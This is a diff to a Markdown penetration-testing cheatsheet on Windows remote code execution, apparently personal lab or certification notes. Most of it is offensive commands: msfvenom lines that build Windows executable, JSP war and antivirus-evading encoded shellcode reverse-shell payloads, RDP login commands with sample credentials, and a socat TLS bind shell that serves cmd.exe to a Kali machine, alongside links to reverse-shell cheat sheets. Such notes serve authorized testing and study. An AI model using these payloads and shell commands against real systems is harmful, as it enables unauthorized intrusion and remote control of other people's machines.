@@ -1,32 +1,40 @@
 # Windows Remote Code Execution
 
-## <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)</a>
+## <a href='https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/' target="blank">MSFVenom Reverse Shell Payload Cheatsheet</a>
 
 ## <a href='https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md' target="blank">Reverse Shell Cheat Sheet</a>
 
-### Check list
+=== "Shell File"
 
-``` bash
-msfvenom  --list encoders
-```
+	``` bash
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+	```
 
-### File
+=== "Java Code"
 
-``` bash
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
-```
+	``` bash
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+	```
 
-### Shell Code
+=== "Shell Code"
 
-``` bash
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -v shellcode -f py
-```
+	``` bash
+	msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "<badchars>"
+	```
+
+=== "Encoders"
+
+	``` bash
+	msfvenom  --list encoders
+	```
 
 ## <a href='https://miloserdov.org/?p=4516' target="blank">Windows remote desktop from Linux</a>
 
 ``` bash
 rdesktop $ip -u Tester -p Pass
+```
 
+``` bash
 xfreerdp /f /u:Tester /p:<Pass> /v:192.168.0.101 /drive:D,/tmp
 ```
 
@@ -85,16 +93,16 @@ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 999 -out 
 cat bind_shell.key bind_shell.crt > bind_shell.pem
 ```
 
-Kali machine
-
-``` bash
-sudo socat OPENSSL:192.168.11.130:443,verify=0
-```
-
 Windows machine
 
 ``` bash
 socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe
+```
+
+Kali machine
+
+``` bash
+sudo socat OPENSSL:192.168.11.130:443,verify=0
 ```
 
 ## PowerShell
